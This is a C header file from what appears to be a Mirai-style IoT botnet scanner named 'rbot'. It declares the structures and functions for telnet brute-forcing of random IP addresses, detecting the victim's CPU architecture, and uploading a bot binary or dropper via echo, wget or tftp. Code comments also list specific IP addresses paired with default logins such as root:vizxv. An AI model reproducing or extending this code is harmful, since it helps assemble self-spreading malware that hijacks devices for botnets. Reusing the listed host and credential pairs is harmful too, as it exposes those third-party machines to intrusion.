#pragma once

#include <stdint.h>

#include "includes.h"
#include <string.h>

#ifdef DEBUG
#define SCANNER_MAX_CONNS   5000
#define SCANNER_RAW_PPS     5500
#else
#define SCANNER_MAX_CONNS   628
#define SCANNER_RAW_PPS     760
#endif

//[179.157.169.71:23] [guest:12345]
//182.72.230.25:23 root:vizxv

#define SCANNER_RDBUF_SIZE  8192
#define SCANNER_HACK_DRAIN  6144

#define FN_BINARY ".rbot.binary"
#define FN_DROPPER ".rbot.dropper"
#define FN_SHELL ".rbot.shell"

struct scanner_auth {
    char *username;
    char *password;
    uint16_t weight_min, weight_max;
    uint8_t username_len, password_len;
};

struct telnet_info
{
    int has_arch;

    enum
    {
        UPLOAD_ECHO,
        UPLOAD_WGET,
        UPLOAD_TFTP,
		UPLOAD_SHELL,
        UPLOAD_END
    } upload_method;
};

struct scanner_connection {
    struct scanner_auth *auth;
    struct telnet_info info;
	int fd, last_recv, rdbuf_pos, echo, oppsitearm;
    char rdbuf[SCANNER_RDBUF_SIZE], arch[16];
	uint8_t tries, bit, endianness, dropper_index;
    uint16_t dst_port;
	uint16_t machine;
	ipv4_t dst_addr;

	enum {
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
		SC_WAITING_PASSWD_RESP,
        SC_CONSUME_ARCH,
		SC_CONSUME_ELF_HEADER,
		SC_CONSUME_SUBARM,
		SC_CONSUME_WRDIR,
		SC_CONSUME_SEND_METHOD,
		SC_METHOD_ECHO,
		SC_METHOD_CONSUME,
		SC_FINISH_RESONSE_EXIT,
        SC_METHOD_ECHO_EXIT,
    } state;
};

enum {
	NUM_OF_PAYLOADS = 4,  // Number of payloads
	ENDIAN_LITTLE = 1,    // Little endian
    ENDIAN_BIG = 2,       // Big endian
    EM_NONE = 0,          // None
    EM_ARM = 40,          // ARM
    EM_ARM7 = 41,         // unoficially arm7
    EM_MIPS = 8,          // mips/mpsl (depends on endian)
    EM_MPSL = 10,
    EM_PPC = 20,          // PowerPC
	EM_X86_64 = 62,       // amd x86_64
    EM_486 = 6,           // x86
    EM_386 = 3,
    EM_M32 = 1,
    EM_AARCH64 = 183,
	MAX_ECHO_BYTES = 64, // Max echo bytes
};

struct payload
{
    uint8_t endian;
    uint8_t machine;
    char *str;
    uint16_t len;
};

struct binary
{
    char *str;
    uint8_t index;
};

void scanner_init();
void scanner_kill(void);

static void setup_connection(struct scanner_connection *);
static ipv4_t get_random_ip(void);

static int consume_iacs(struct scanner_connection *);
static int consume_shell_prompt(struct scanner_connection *);
static int consume_login_prompt(struct scanner_connection *, int);
static int consume_resp_prompt(struct scanner_connection *);
static int consume_method_resonse(struct scanner_connection *);
static int parse_elf_response(struct scanner_connection *);
static int consume_arm_subtype(struct scanner_connection *);
static int connection_consume_upload_methods(struct scanner_connection *);

static void add_auth_entry(char *, char *, uint16_t);
static struct scanner_auth *random_auth_entry(void);
static char *deobf(char *, int *);
static BOOL can_consume(struct scanner_connection *, uint8_t *, int);
